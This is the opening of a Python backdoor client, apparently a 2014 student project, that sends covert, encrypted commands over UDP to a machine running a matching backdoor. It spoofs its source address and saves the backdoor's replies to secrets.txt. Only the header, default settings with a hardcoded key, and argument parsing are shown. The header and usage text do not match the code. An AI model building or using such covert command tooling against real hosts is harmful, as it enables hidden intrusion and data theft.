#####################################################################################################################
##	SOURCE FILE:		client.c - A simple UDP client that sends covert messages to a backdoor.
##
##	PROGRAM:		    client
##
##	FUNCTIONS:
##
##	LAST MODIFIED:		October 6, 2014
##
##	DESIGNERS:	        Slade Solobay & Zach Smoroden
##
##	PROGRAMMERS:        Slade Solobay & Zach Smoroden
##
##	NOTES:
##	The program will send a covert message to a specific IP address (an IP running the backdoor.py) over a specific
##  destination port. The program also has the ability to spoof the source port and source IP address. Once a command
##  is sent the client will wait for a responce from the backdoor and save the output to secrets.txt.
##
##  OUTPUT: secrets.txt - will be saved in the program root directory.
##
##	USAGE: ./client -d [Destination IP] -p [Destination Port] -h [Source IP] -s [Source Port] -i [Interface]
##
#####################################################################################################################
import sys
from scapy.all import*
import time
import os
import getopt
from itertools import izip, cycle

###################### USER DEFINED VARIABLE ##########################
DEFAULT_INTERFACE = 'em1'

DEFAULT_SRC_PORT = 8000
DEFAULT_DST_PORT = 7999

DEFAULT_SRC_IP = "192.168.0.5"

ENCRYPTION_KEY = "zdehjk"
######################################################################

def usage():
    "This prints usage example for the program"
    print("Usage: %s -d <Destination IP> -p [Destination Port] -b [Source IP] -s [Source Port] -i [Interface]")
    print("You must specify the destination address!")
    return

##Set Default Values
interface = DEFAULT_INTERFACE
sport = DEFAULT_SRC_PORT
dport = DEFAULT_DST_PORT
src = DEFAULT_SRC_IP
dest = None

try:
    opts, args = getopt.getopt(sys.argv[1:], 'd:p:b:s:i:h', ['dest=', 'dport=', 'src=', 'sport=', 'interface=', 'help'])
except getopt.GetoptError:
    usage()
    sys.exit(2)

for opt, arg in opts:
    if opt in ('-h', '--help'):
        usage()
        sys.exit(2)
    elif opt in ('-d', '--dest'):
        dest = arg
    elif opt in ('-p', '--dport'):
        dport = arg
    elif opt in ('-b', '--src'):
        src = arg
    elif opt in ('-s', '--sport'):
        sport = arg
    elif opt in ('-i', '--interface'):
        interface = arg
    else:
        usage()
        sys.exit(2)

##Did they supply a destination IP?
if not dest:
    usage()
    sys.exit(2)


